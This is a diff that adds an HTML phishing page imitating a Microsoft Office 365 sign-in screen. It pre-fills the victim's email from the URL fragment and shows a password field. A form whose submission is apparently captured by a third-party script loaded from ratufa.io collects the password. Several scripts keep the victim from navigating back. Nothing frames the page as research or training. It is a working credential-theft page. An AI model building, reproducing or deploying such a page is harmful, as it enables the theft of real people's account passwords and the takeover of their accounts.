@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/x-icon" href="https://github.com/cdtechdigital/images/blob/main/office365icon.png?raw=true">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at 10% 20%, rgb(239, 246, 255) 0%, rgb(219, 234, 254) 90%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .main-wrapper {
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        /* Top Box - Contact Us Form */
+        .form-container {
+            background-color: #ffffff;
+            padding: 44px;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+            position: relative;
+            min-height: 340px;
+        }
+
+        /* Bottom Box - Image Placeholder */
+        .image-container {
+            background-color: #ffffff;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+            min-height: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #70757a;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #202124;
+            font-size: 14px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #bababa;
+            border-radius: 2px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: #0067b8;
+        }
+
+        textarea.form-control {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        /* Sharp Blue Submit Button perfectly positioned matching the image */
+        .submit-btn {
+            position: absolute;
+            bottom: 44px;
+            right: 44px;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 6px 32px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background-color 0.1s;
+        }
+
+        .submit-btn:hover {
+            background-color: #005da6;
+        }
+
+        /* Windows Activation / Footer Area */
+        .page-footer {
+            position: fixed;
+            bottom: 16px;
+            right: 24px;
+            text-align: right;
+            font-size: 12px;
+            color: #555555;
+            pointer-events: none;
+        }
+
+        .activate-msg {
+            color: rgba(0, 0, 0, 0.35);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            color: #333333;
+            text-decoration: none;
+            margin-left: 12px;
+            pointer-events: auto;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <!-- Top Container: Contact Form via FormSubmit -->
+        <div class="form-container">
+<img src="https://github.com/cdtechdigital/images/blob/main/office365log.JPG?raw=true" alt="Left Aligned" align="left"><br>
+    
+            <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <div class="form-group">
+
+                    <label for="name"></label>
+                        
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+                
+                <div class="form-group">
+                    <label for="email"></label>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+  
+                <br><br><br>
+                <button type="submit" class="submit-btn">Next</button>
+            </form>
+        </div>
+
+        <!-- Bottom Container: Image Placeholder Underneath -->
+        <div class="image-container">
+            <!-- Place your <img> element here inside this plain white box -->
+                        <img src="https://github.com/cdtechdigital/images/blob/main/office365.JPG?raw=true" alt="Trulli" width="" height="">
+        </div>
+    </div>
+
+    <!-- Interface Footer Elements -->
+    <div class="page-footer">
+        <div class="activate-msg">Activate Windows<br><span style="font-size: 11px;">Go to Settings to activate Windows.</span></div>
+        <div class="footer-links">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">...</a>
+        </div>
+    </div>
+<script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
